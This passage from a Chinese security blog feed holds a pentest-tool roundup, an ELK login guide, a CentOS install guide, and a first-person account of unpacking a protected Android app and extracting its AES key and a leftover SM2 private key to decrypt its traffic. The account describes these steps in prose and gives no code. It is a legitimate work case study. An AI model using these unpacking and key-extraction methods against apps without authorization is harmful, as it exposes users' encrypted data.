        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-Probely"><a href="#1-Probely" class="headerlink" title="1.Probely"></a>1.Probely</h1><p><a href="https://probely.com/web-vulnerability-scanner/security-teams/">https://probely.com/web-vulnerability-scanner/security-teams/</a></p><p>probly扫描网络中的漏洞，帮助安全专业人员识别关键漏洞并及时修复。主要功能包括扫描SQL注入、XSS、应用程序漏洞等等。通过与JIRA和Slack的深入集成，此工具允许多个团队成员为整个网络评估过程做出贡献。入侵检测机制是一个额外的优势，以及各种网络报告。Probely扫描您的网络，不会留下任何东西，为安全专业人员带来更好的可见性。</p><a id="more"></a><h1 id="2-Netsparker"><a href="#2-Netsparker" class="headerlink" title="2.Netsparker"></a>2.Netsparker</h1><p><a href="https://www.netsparker.com/">https://www.netsparker.com/</a></p><p>Netsparket是另一个漏洞评估工具，它扫描网络中的SQL注入、XSS和其他web应用程序漏洞。这是一个云端和场所。Netsparket的最佳优点包括基于扫描技术的精确检测和特定证据。它还检测URL重写和404错误页面，以及与bug跟踪协议的无缝集成。高速扫描将是另一个特长，它可以在一天内扫描1000个网络应用程序。</p><h1 id="3-Wallarm"><a href="#3-Wallarm" class="headerlink" title="3.Wallarm"></a>3.Wallarm</h1><p><a href="https://wallarm.com/">https://wallarm.com/</a></p><p>Wallarm结合了机器学习来模拟api、应用程序和其他服务的安全性。这种与机器学习的集成使它能够测试并帮助DevOps部门在整个网络基础设施中设计更好的工作流。Wallarm的自动化WAF将与公共云、私有云和混合云协同工作，最终与AWS、CNCF和Google建立了良好的合作关系。Wallarm中的AI引擎帮助开发人员识别数据模式，利用引擎先前的遭遇消除弱点，帮助他们开发强大的安全代码，</p><h1 id="4-Acunetix"><a href="#4-Acunetix" class="headerlink" title="4.Acunetix"></a>4.Acunetix</h1><p><a href="https://www.acunetix.com/">https://www.acunetix.com/</a></p><p>Acunetix是安全专业人士最好的软件之一，因为它模仿黑客，从而使安全专业人士领先网络罪犯一步。它负责HTML5、JavaScript、SQL注入、XSS等等。所有的web应用程序和服务都被清楚地监控，以便更好地为任何意外的失败做好准备。除了web应用程序的漏洞之外，这一个还负责WordPress核心和插件。凭借快速扫描功能，Acunetix也是一个重要的软件安全专业人士需要拥有的。</p><h1 id="5-BurpSuite"><a href="#5-BurpSuite" class="headerlink" title="5.BurpSuite"></a>5.BurpSuite</h1><p><a href="https://portswigger.net/">https://portswigger.net/</a></p><p>Burpuite是一款优秀的web应用程序安全和黑客软件，用于安全测试；它的功能提供了重要的渗透测试程序。从映射到应用程序攻击向量的分析，这个工具是渗透测试团队的正确软件包。自动扫描程序、漏洞管理框架、广泛的法规遵从性报告、详细的扫描方法使Burpuite成为下一代安全评估工具。</p><h1 id="6-Angry-IP-Scanner"><a href="#6-Angry-IP-Scanner" class="headerlink" title="6.Angry IP Scanner"></a>6.Angry IP Scanner</h1><p><a href="https://angryip.org/">https://angryip.org/</a></p><p>Angry IP scanner是一款开源黑客软件，涵盖跨平台，为安全专业人士提供道德黑客功能。扫描本地网络、文件、命令行界面，以及许多数据获取程序，还可以帮助进行大量的数据导出。</p><h1 id="7-Qualys-Guard"><a href="#7-Qualys-Guard" class="headerlink" title="7.Qualys Guard"></a>7.Qualys Guard</h1><p><a href="https://www.qualys.com/">https://www.qualys.com/</a></p><p>Qualy Guard是另一家主要的安全供应商，帮助企业简化网络的安全性和法规遵从性。这个网络安全和黑客软件也有助于企业检查他们的云系统漏洞。处理数据漏洞、可见性、数据分析、实时威胁等。可靠性、准确性和简单性是Qualyguard的最佳优势。</p><h1 id="8-HashCat"><a href="#8-HashCat" class="headerlink" title="8.HashCat"></a>8.HashCat</h1><p><a href="https://hashcat.net/hashcat/">https://hashcat.net/hashcat/</a></p><p>HashCat是一个密码破解软件，它可以帮助恢复忘记的密码，并检查密码历史记录以执行审核和报告。</p><p>它是一个开放源代码平台，涵盖跨平台，负责同一网络内的多个设备，该平台配有集成的热监视器、内置基准系统，并支持分布式破解网络。最重要的是，它还支持网络的自动性能管理。</p><h1 id="REF："><a href="#REF：" class="headerlink" title="REF："></a>REF：</h1><p><a href="https://www.softwaretestinghelp.com/penetration-testing-tools/">https://www.softwaretestinghelp.com/penetration-testing-tools/</a></p><p><a href="https://www.guru99.com/learn-everything-about-ethical-hacking-tools-and-skills.html">https://www.guru99.com/learn-everything-about-ethical-hacking-tools-and-skills.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小白如何在三天一步步逆向app，找到私钥</title>
      <link href="/2020/09/18/mobilesecurity-experience/"/>
      <url>/2020/09/18/mobilesecurity-experience/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本人今年应届生，就职于甲方安全，研究生期间主要做开发，偶尔做做渗透，护护网；工作了呢，主要维护内部系统的安全，对于移动逆向这块，只简单用burpsuite，顺顺利利抓过app的包。突然有一天，老大说，有个app，fiddler抓包，服务器不响应客户端发的包，让看看咋回事？于是就有了接下来三天不吃不喝不眠不休的入坑爬坑的过程~·所有用到的工具，都在文章开头列出</p><a id="more"></a><h1 id="1-工具"><a href="#1-工具" class="headerlink" title="1  工具"></a>1  工具</h1><h2 id="1-1-抓包工具"><a href="#1-1-抓包工具" class="headerlink" title="1.1 抓包工具"></a>1.1 抓包工具</h2><table><thead><tr><th>工具名称</th><th>使用平台</th><th>抓包类型</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>Wireshark</td><td>linux、windows</td><td>网络7层协议</td><td>linux平台支持好,功能强大，可抓网络7层的包</td><td>不能解析https的内容</td></tr><tr><td>Fidder</td><td>windows</td><td>http，https 和FTP协议</td><td>功能强大，支持修改报文，重放报文</td><td>仅支持windows</td></tr><tr><td>Charles</td><td>window、Mac</td><td>http,socket</td><td>可以按照域名进行分层级查看</td><td>需要收费</td></tr><tr><td>BurpSuite</td><td>支持java的平台</td><td>http,https</td><td>黑客喜欢用的功能强大工具，可以重放包，篡改包等进行一些包的攻击。</td><td>界面不是很好看</td></tr><tr><td>HttpCanary</td><td>Android</td><td>http,https，WebSocket</td><td>使用方便</td><td>只支持Android</td></tr></tbody></table><p>手机只能安装crt证书</p><h2 id="1-2-反汇编工具"><a href="#1-2-反汇编工具" class="headerlink" title="1.2 反汇编工具"></a>1.2 反汇编工具</h2><table><thead><tr><th>描述</th><th>所需要软件</th><th>步骤</th><th>优缺点</th></tr></thead><tbody><tr><td>较老一套</td><td>dex2jar:将dex转化成jar<br>JD-GUI : 反编译jar中的源码 <br>apktool.jar</td><td><a href="https://blog.csdn.net/qq_33721320/article/details/83413283">Android反编译apk逆向分析</a></td><td>使用复杂</td></tr><tr><td>上面工具的封装</td><td>AndroidKiller_v1.3.1</td><td><a href="https://wizardforcel.gitbooks.io/fl-android-re-tut/content/3.1.html">AndroidKiller教程</a></td><td>使用复杂</td></tr><tr><td>强大</td><td>jadx</td><td>直接拖apk到即可</td><td>使用方便</td></tr></tbody></table><h2 id="1-3-查壳工具："><a href="#1-3-查壳工具：" class="headerlink" title="1.3 查壳工具："></a>1.3 查壳工具：</h2><p>ApkScan</p><h2 id="1-4-脱壳工具："><a href="#1-4-脱壳工具：" class="headerlink" title="1.4 脱壳工具："></a>1.4 脱壳工具：</h2><p>反射大师，FDEX等</p><h1 id="2-逆向过程"><a href="#2-逆向过程" class="headerlink" title="2 逆向过程"></a>2 逆向过程</h1><p>·文章废话比较多，为了使各位看客看的明白，先抛出整个爬坑过程：<strong>抓包–》反汇编–》脱壳–》拿到私钥</strong></p><h2 id="2-1-抓包"><a href="#2-1-抓包" class="headerlink" title="2.1 抓包"></a>2.1 抓包</h2><p>话说回来，老大说fiddler抓包失败，于是乎，从网上下载fillder，用我的oppo手机装上证书，开始了第一次fiddler抓包之旅，网上随手找一篇<a href="https://www.jianshu.com/p/5a353e164e7c">抓包攻略</a>，发现连接失败，（这里有个坑：公司网络刚好不可以访问这个app，开始弄了好久，都是0字节，后面换了自己热点，就出现连接失败，说到这里真的想吐槽公司网络）</p><p>接着用我最熟悉的burpsuite抓包，发现抓不了https的包，证书也安装了呀，其他https请求都可以抓，刚开始以为是证书的问题，并且app，始终报错，证书校验错误，让我更加以为是证书的问题。。但是又没办法解决，，就想着再换个抓包工具，charls抓包后send成功，但是response都失败了。</p><p>这时候打开微信问问我以前实验室的大佬，听说现在搞app逆向，他推荐了一款手机抓包神器httpCanary，直接安装到手机，抓包是超级方便呀，但是令人奔溃的是app依旧报错，证书校验错误，到这里内心很奔溃，开始网上搜，抓包失败，发现了这篇文章<a href="https://www.cnblogs.com/magicalpig/p/12671559.html">部分APP使用burpsuite抓不到包原因</a>，猜测可能app使用了双向认证或SSL-pinning(证书绑定) ，并谷歌这两个词汇，理解如下：</p><p><strong>单向认证：</strong>一般的客户端所作的都是单向认证，即客户端只需要验证服务器端的证书，确保服务器来源的可靠性，服务器端无需验证客户端证书。</p><p><strong>双向认证：</strong>客户端验证服务器端证书，服务器端也需要验证客户端证书。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602240311892.png" alt="1602240311892"></p><p><a href="https://zhuanlan.zhihu.com/p/58204817"><strong>SSL-pinning(证书绑定)：</strong></a></p><p><img src="/2020/09/18/mobilesecurity-experience/1602298885190.png" alt="1602298885190"></p><p>如上图所示： 证书锁定（SSL/TLS Pinning）提供了两种绑定方式： Certificate Pinning 和 Public Key Pinning，过程如下：</p><p>1）：首先对服务器端证书/证书中的公钥进行哈希，得到ssl指纹内置到app中。</p><p>2）：通信连接时，服务器发来证书。</p><p>3）：app对该证书进行哈希操作，将哈希值与app内置的ssl指纹进行对比，若对比成功，则建立连接，否则，断开连接。</p><p>弄懂双向认证和ssl-pinning原理后，结合中间人攻击原理（如下图），进行猜想如下：</p><p>1）如果该app使用的双向认证，即同时认证客户端证书，则在下图中间人与服务器端的交互中，中间人需要提供app的证书。客户端与中间人交互正常。</p><p>2）如果该app使用的是ssl-pinning，即客户端需要对服务器证书进行校验，则在下图客户端与中间人交互中，中间人的需要提供原有服务器端的证书。中间人与服务器端交互正常。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602299413602.png" alt="1602299413602"></p><p>无论是app证书还是服务器端证书，女生第六感觉得app中可能会有，因此下一步想着逆向app，看下app里面有没有证书啥的，然后代理绑定原有证书就可以正常抓包了。（后面发现我是有多天真）</p><h2 id="2-2-反汇编"><a href="#2-2-反汇编" class="headerlink" title="2.2 反汇编"></a>2.2 反汇编</h2><p>开始网上搜索apk反汇编教程，搜到了一篇超详细利用四件套反汇编apk教程，<a href="https://blog.csdn.net/qq_33721320/article/details/83413283">Android反编译apk逆向分析</a> ,按照他的步骤，先解压apk，查看解压后的文件发现了几个证书，一个后缀为cer的证书（看到这个证书个人感觉app应该用了双向认证吧，当时我愚蠢的以为这个证书即是服务器证书，也是客户端证书，因此下一步目标明确为：代理安装客户端证书即可），一个后缀为bks的deb_keystore.bks（这个时候我还不知道bks是啥）。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602311148129.png" alt="1602311148129"></p><p>下一步目标为中间人代理安装app客户端证书，我常用的工具为burpsuite，发现其可以导入客户端证书，在user options-&gt;ssl-Clinet ssl certificates下：<img src="/2020/09/18/mobilesecurity-experience/1602312160658.png" alt="1602312160658"></p><p>后面发现burp suite只可导入pem类型的证书，且需要输入密码，这时候我天真的以为密码可以读取反汇编后的源码中找，然后将可以将cer证书转为pem 证书，就可以成功导入客户端证书。但是反汇编后的dex源码可读性很差，并没有得到有用的东西，又看看cer证书转为pem证书格式，发现需要私钥，哎，这个时候打开微信，找找以前实验室的大佬，有没有好的反汇编工具推荐（这个时候一直以为反汇编工具不行），大佬推荐了jadx神器，直接拖拉apk即可，但是反汇编出的代码可读性仍然不太高，并没有有用的信息。但是收获了，不同格式证书的区别，<a href>总结在此</a>。于是又开始不断地谷歌，能否绕过ssl pinning(此时我也不确定是不是用了证书绑定还是双向认证，但是总得做点啥吧)，网上绕过ssl pinning需要 JustTrustMe，root手机啥的，我这刚买的oppo，也不能root呀，变搬砖了没钱买呀。尝试用模拟器呢，这个app简直了，首先尝试强大的夜神模拟器，app打开没反应，接着逍遥模拟器失败，mumu模拟器失败，天天模拟器失败，哎筋疲力尽的一天··········出去上了个厕所透透气 回来，app到底是不是用了ssl pining?或者双向认证？？？于是用httpCanary重新抓包详细看看了，这个时候突然有了重大发现，httpCanary抓包失败，有报错信息如下：</p><p><img src="/2020/09/18/mobilesecurity-experience/1602315130773.png" alt="1602315130773"></p><p>抓包失败因为Android 7.0以上，系统就不会信任安装用户的证书，也就是说，android不信任装的httpCanary根证书，当app进行交互时，没有可信任的根证书，因此交互失败。从下图的流程图可以看到，如果根证书可信，才会去判断该证书是否校验成功（ssl pinning/双向认证成功），因此，该app可能没有做双向认证或者ssl pinning，做没做找个android 7.0以下的手机试试就知道了。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602316415405.png" alt="1602316415405"></p><p>第二天，从家里拿了个之前的老手机，android 6.0系统的，安装httpcanary抓包，安装目标app，进行登录，突然发现旧手机的触屏有问题，刚好按密码那块失灵了<del>我的天啊</del>··真的命途多舛，<del>·后面灵机一动，可以放大屏幕，移动到触屏好的区域输入即可（我可真是个小机灵鬼）</del>果然抓包成功！！！1喜大普奔啊啊啊啊<del>·昨天一天我是在搞啥呀</del>····</p><p>然后贼开心的去找老大，说可以抓到包了，老大说通信内容可以解密么？需要看通信数据。分析下报文发现：</p><p>客户端app发送给服务器端用的是sm2密文(客户端存sm2公钥加密，服务器端存私钥解密)，服务器端发送给客户端app的是AES密文（客户端和服务器端都存有AES对称密钥），即使逆向app，也只能发现AES密钥，sm2密钥存在服务器端，哎找到一个是一个吧，然后又开始漫漫长路~·…..</p><h2 id="2-3-脱壳"><a href="#2-3-脱壳" class="headerlink" title="2.3 脱壳"></a>2.3 脱壳</h2><p>之前反汇编的源码都没啥结果，又谷歌发现app是不是加了壳，做了代码混淆啥的，于是网上下载了查壳工具ApkScan，果然发现该app加了阿里聚安全的壳。然后在旧手机上开始了一系列脱壳之旅：</p><p>（1）首先使用网上教程<a href="https://www.jianshu.com/p/dbe579f6cc84">脱壳工具FDex2</a>,进行脱壳，（旧手机手机安装 VirtualXposed，FDex2+total conmander（自带amaze文件管理器下载打开失败）），但是并没有在data/data目录文件夹中看到dex文件，脱壳失败。</p><p>（2）然后使用网上超牛的反射大师进行脱壳，<a href="https://blog.csdn.net/qq_41855420/article/details/106276824">利用反射大师超详细脱壳教程</a>，使用反射大师3.0，3.5版本，脱壳后有5个dex文件，但是源码可读性还是较差，没有找到有用代码，感觉脱壳还是失败。</p><p>（3）尝试其他脱壳工具，。。都一一失败<del>···一无所获</del>·不知所向~···</p><p>就这样又一天过去了~····回家睡觉</p><p>第三天换了清醒的脑袋，开始查看别人的脱壳经历，逆向app经历，突然发现一篇有趣的文章：<a href="https://zhuanlan.zhihu.com/p/60392573">为了抓包某app,我折腾了10天,原来他是用SSL Pinning防抓包的</a>，看到楼主的经历，我内心也好过多了，翻看评论时候，看到有个读者提问密钥是怎么获取的，楼主说从低版本获取，这可是个重要信息呀。我立刻从网上下载了低版本，利用反射大师一顿操作猛如虎，逆向出8个dex文件，有7M,9M的，心想这下有希望了，果然逐个打开dex搜索AES，惊喜发现AES密钥：果然利用在线AES解密成功。</p><p><img src="/2020/09/18/mobilesecurity-experience/1602320940221.png" alt="1602320940221"></p><p>再搜索sm2_encrypt，发现sm2公钥和疑似sm2私钥（我的天，猜测app工程师用于测试忘记删除了）</p><p><img src="/2020/09/18/mobilesecurity-experience/1602321152209.png" alt="1602321152209"></p><p>将dex转为jar，IDE导入该库文件，调用apk中的sm2加解密函数，成功解密出交互密文！！</p><h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h1><p>头秃的三天终于结束了！！只是一个记录小白逆向app的心酸过程，总结三点如下：</p><p>（1）逆向低版本app，这个真的是太重要了</p><p>（2） 安卓模拟器运行app失败后，最好用Android7.0以下进行测试。</p><p>（ 3）要有一个强大的内心和一直转的脑子<del>搞不动了可以换换方向，说不定柳暗花明又一村呢</del>···</p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>1 <a href="https://www.cnblogs.com/magicalpig/p/12671559.html">部分APP使用burpsuite抓不到包原因</a>    </p><p>2 <a href="https://zhuanlan.zhihu.com/p/58204817">证书锁定SSL Pinning简介及用途</a>  </p><p>3 <a href="https://crifan.github.io/app_capture_package_tool_charles/website/appendix/reference.html"> 破解https的SSL Pinning</a>   很详细</p><p>4 <a href="https://www.cnblogs.com/mysticbinary/p/11609825.html">Androidkiller反汇编失败的解决方案</a>  能不用就不用，太复杂啦</p><p>5 <a href="http://dashy.cn/2020/01/11/%E8%AF%81%E4%B9%A6%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E4%BA%92%E8%BD%AC/">证书格式互转</a>  很nice 虽然我没用到</p><p>6 <a href="https://www.jianshu.com/p/dbe579f6cc84">脱壳工具FDex2</a>   很详细  但是 Amaze 文件管理器下载打开失败，尝试用<a href="https://blog.csdn.net/weixin_36001685/article/details/101020843">total conmander</a>成功</p><p>7 <a href="https://blog.csdn.net/qq_41855420/article/details/106276824">利用反射大师超详细脱壳教程</a>   很nice，</p>]]></content>
      
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>elk笔记二--通过X-Pack权限控制设置elk登录</title>
      <link href="/2020/09/11/elk-login/"/>
      <url>/2020/09/11/elk-login/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p> 给ES和kibana设置用户登陆，或者使用nginx限制IP或用户访问。本文介绍ELK自带的创建用户的方式。 首先贴了张网上的图可以看到ELK架构使用图。<a id="more"></a></p><p><img src="https://images2018.cnblogs.com/blog/790307/201803/790307-20180313090706209-1391916396.jpg" alt="img"></p><h1 id="1-修改ES配置开启X-PACK"><a href="#1-修改ES配置开启X-PACK" class="headerlink" title="1 修改ES配置开启X-PACK"></a>1 修改ES配置开启X-PACK</h1><p>修改配置文件elasticsearch.yml内容如下：</p><p>ELK菜鸟手记 (三) - X-Pack权限控制之给Kibana加上登录控制以及index_not_found_exception问题解决</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vi /etc/elasticsearch/elasticsearch.yml</span>http.cors.enabled: <span class="token boolean">true</span>http.cors.allow-origin: <span class="token string">"*"</span>http.cors.allow-headers: Authorizationxpack.security.enabled: <span class="token boolean">true</span>xpack.security.transport.ssl.enabled: <span class="token boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/09/11/elk-login/1603957755321.png" alt="1603957755321"></p><p>重启ES：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 elasticsearch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl restart elasticsearch</span><span class="token punctuation">[</span>root@ids0001 elasticsearch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl status elasticsearch</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="2-创建用户"><a href="#2-创建用户" class="headerlink" title="2 创建用户"></a>2 创建用户</h1><p>输入下列命令后，一次输入各个账户的密码：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd /usr/share/elasticsearch</span><span class="token punctuation">[</span>root@ids0001 elasticsearch<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># bin/elasticsearch-setup-passwords interactive</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>内置账户的含义：<br> elastic内置超级用户。请参阅内置角色。<br> kibana用户Kibana用于连接Elasticsearch并与之通信。<br> logstash_system:Logstash用户在Elasticsearch中存储监视信息时使用。<br> beats_system:eats在Elasticsearch中存储监控信息时使用的用户。<br> apm_system:APM服务器在Elasticsearch中存储监视信息时使用的用户。<br> remote_monitoring_user:Metricbeat用户在Elasticsearch中收集和存储监控信息时使用。它具有remote_monitoring_agent和 remote_monitoring_collector内置的角色。</p><p><img src="/2020/09/11/elk-login/1603958077193.png" alt="1603958077193"></p><h1 id="3-修改Kibana配置"><a href="#3-修改Kibana配置" class="headerlink" title="3 修改Kibana配置"></a>3 修改Kibana配置</h1><p>vi /etc/kibana/kibana.yml </p><pre class="line-numbers language-bash"><code class="language-bash">elasticsearch.username: <span class="token string">"kibana_system"</span>elasticsearch.password: <span class="token string">"kibana*2020"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>重启Kibana</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl restart kibana</span><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># systemctl status kibana</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="4-修改logstash配置"><a href="#4-修改logstash配置" class="headerlink" title="4  修改logstash配置"></a>4  修改logstash配置</h1><p>3  配置logstash</p><p>vi /etc/logstash/conf.d/logstash.conf</p><p><img src="/2020/09/11/elk-login/1603959501523.png" alt="1603959501523"></p><p>重启logstash</p><pre class="line-numbers language-bash"><code class="language-bash">/usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="5登录"><a href="#5登录" class="headerlink" title="5登录"></a>5登录</h1><h2 id="5-1-登陆elasticsearch"><a href="#5-1-登陆elasticsearch" class="headerlink" title="5.1 登陆elasticsearch"></a>5.1 登陆elasticsearch</h2><p><img src="/2020/09/11/elk-login/1603959003797.png" alt="1603959003797"></p><h2 id="5-2-登陆kibana使用elasticsearch"><a href="#5-2-登陆kibana使用elasticsearch" class="headerlink" title="5.2 登陆kibana使用elasticsearch"></a>5.2 登陆kibana使用elasticsearch</h2><p>输入用户名：elastic和logstash.conf中的密码，</p><p><img src="/2020/09/11/elk-login/1603958930073.png" alt="1603958930073"></p><p><img src="/2020/09/11/elk-login/1603974376447.png" alt="1603974376447"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/wsdc0521/article/details/106344974">ELK系列(九)、配置ES和Kibana的用户密码</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安装教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vm 安装centos 7教程详解</title>
      <link href="/2020/09/11/install-guide-centosInvm/"/>
      <url>/2020/09/11/install-guide-centosInvm/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1 前期准备"></a>1 前期准备</h1><p>1）VMware虚拟机</p><ol start="2"><li>centos镜像，我用的是centos7</li></ol><a id="more"></a><p>官网下载地址：</p><p> <a href="http://isoredirect.centos.org/centos/">http://isoredirect.centos.org/centos/</a> 或者 <a href="http://apache.apooloo.cn/#/down/b6cfbd0dfda13a7f46125288e8ea8831">http://apache.apooloo.cn/#/down/b6cfbd0dfda13a7f46125288e8ea8831</a> </p><p><img src="/2020/09/11/install-guide-centosInvm/1603246800490.png" alt="1603246800490"></p><h1 id="2-新建虚拟机"><a href="#2-新建虚拟机" class="headerlink" title="2 新建虚拟机"></a>2 新建虚拟机</h1><p>（1）新建虚拟机</p><p><img src="/2020/09/11/install-guide-centosInvm/1603246938246.png" alt="1603246938246"></p><p>（2）选择自定义虚拟机</p><p><img src="/2020/09/11/install-guide-centosInvm/1603246969975.png" alt="1603246969975"></p><p>（3）兼容性选择</p><p>选择当前虚拟机版本就可，尽量选择高版本，因为高版本虚拟机可以兼容低版本创建的虚拟机。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247049675.png" alt="1603247049675"></p><p>（4）</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247121052.png" alt="1603247121052"></p><p>（5） 选择Linux的centos7,根据自己下载的镜像属性来选择</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247200778.png" alt="1603247200778"></p><p>（6）填写虚拟机名称和虚拟机所在位置</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247257115.png" alt="1603247257115"></p><p>（7）根据自己需求分配处理器和内核数量，因为有的软件安装需要双核的，因此我选了1个处理器，双核。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247301706.png" alt="1603247301706"></p><p>（8）我宿主机是8G的，给虚拟机分配了2G，1G内存会很卡，建议条件允许下分配2G。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247443067.png" alt="1603247443067"></p><p>（9）网络连接类型的选择，网络连接类型一共有桥接、NAT、仅主机和不联网四种。</p><p>桥接：选择桥接模式的话虚拟机和宿主机在网络上就是平级的关系，相当于连接在同一交换机上。</p><p>NAT：NAT模式就是虚拟机要联网得先通过宿主机才能和外面进行通信。</p><p>仅主机：虚拟机与宿主机直接连起来</p><p>桥接与NAT模式访问互联网过程，如下图所示</p><p><img src="https://img-blog.csdn.net/20180711224004659?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p><p>这里选择NAT模式：</p><p><img src="/2020/09/11/install-guide-centosInvm/1603249663181.png" alt="1603249663181"></p><p>（10）默认SCSI控制器即可，然后一直默认往下</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247594330.png" alt="1603247594330"></p><p>（11）创建新的虚拟机</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247633971.png" alt="1603247633971"></p><p>（12）分配磁盘，新手建议选择单个磁盘即可，满足需求又方便</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247698163.png" alt="1603247698163"></p><p>（13）取消不需要的硬件，若不需要，可以移除声卡等硬件</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247759405.png" alt="1603247759405"></p><p>（14）完成配置</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247816395.png" alt="1603247816395"></p><h1 id="3-安装配置centos"><a href="#3-安装配置centos" class="headerlink" title="3 安装配置centos"></a>3 安装配置centos</h1><p>（1）导入centos镜像，选中创建的虚拟机，右击，选择设置</p><p><img src="/2020/09/11/install-guide-centosInvm/1603247903884.png" alt="1603247903884"></p><p>选择CD/DVD，然后使用ISO映像文件，导入官网下载的iso镜像，然后选择确定。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248005710.png" alt="1603248005710"></p><p>（2） 开启虚拟机</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248058638.png" alt="1603248058638"></p><p>（3）开启虚拟机后会出现以下界面</p><ol><li>Install CentOS 7 安装CentOS 7</li><li>Test this media &amp; install CentOS 7 测试安装文件并安装CentOS 7</li><li>Troubleshooting 修复故障</li></ol><p>选择第一项，安装直接CentOS 7，回车，进入下面的界面</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248982709.png" alt="1603248982709"></p><p>（4）选择语言， 英文、键盘选择美式键盘 ,点击continue</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248188656.png" alt="1603248188656"></p><p>(5)进入设置面板，首先设置时间，点击进行DATE&amp;TIME</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248238624.png" alt="1603248238624"></p><p>选择Asia区域，城市为上海，调节时间和日期如下，然后选择左上角的done</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248344446.png" alt="1603248344446"></p><p>（6）返回设置面板后，选择需要安装的软件;</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248414811.png" alt="1603248414811"></p><p>为了后面的虚拟机使用方便，选择了图像化界面，然后选择了几个组件，点击左上角done即可，如下：</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248586590.png" alt="1603248586590"></p><p>（7）返回面板，进行磁盘划分</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248642104.png" alt="1603248642104"></p><p>因为我们开始设置的是单个磁盘，这里直接选择默认的即可，点击done。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248690126.png" alt="1603248690126"></p><p>（8）返回设置面板，设置主机名和网卡信息</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248829613.png" alt="1603248829613"></p><p>首先设置网卡，打开，看到IP地址（看不到IP地址的应该是选择了桥接模式，前面一定要选择NAT模式），然后输入主机名，点击Apply，设置完成后，点击左上角DOne。</p><p><img src="/2020/09/11/install-guide-centosInvm/1603250501053.png" alt="1603250501053"></p><p>（9）回到设置面板，点击右下角的begin installation，开始安装</p><p><img src="/2020/09/11/install-guide-centosInvm/1603248731326.png" alt="1603248731326"></p><p>（10）设置root密码：</p><p><img src="/2020/09/11/install-guide-centosInvm/1603249251084.png" alt="1603249251084"></p><p><img src="/2020/09/11/install-guide-centosInvm/1603249273725.png" alt="1603249273725"></p><p>（11）还可以设置管理员用户</p><p><img src="/2020/09/11/install-guide-centosInvm/1603249382172.png" 